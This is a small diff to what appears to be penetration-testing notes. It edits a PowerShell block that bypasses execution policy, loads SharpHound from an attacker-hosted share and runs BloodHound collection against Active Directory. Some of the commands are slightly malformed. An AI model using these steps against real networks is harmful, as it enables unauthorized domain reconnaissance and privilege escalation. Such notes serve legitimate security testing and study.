@@ -113,7 +113,7 @@ Using this simple technique we will be able to upload as much privesc tools as w
 BloodHound is a very useful technique of Active Directory gathering. It would be a must in every Privilege Escalation we want to perform.
 We have to download SharpHound.ps1 from its last repository *(it has been changed any times, so we have to check...)*
 ```powershell
-// with our local machine sharing using any technique like python -c SimpeHTTPServer or impacket-smbserver...
+# with our local machine sharing using any technique like python -c SimpeHTTPServer or impacket-smbserver...
 Set-Execution Bypass -Scope Process
 Import-Module [PATH_TO_SHARE]\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
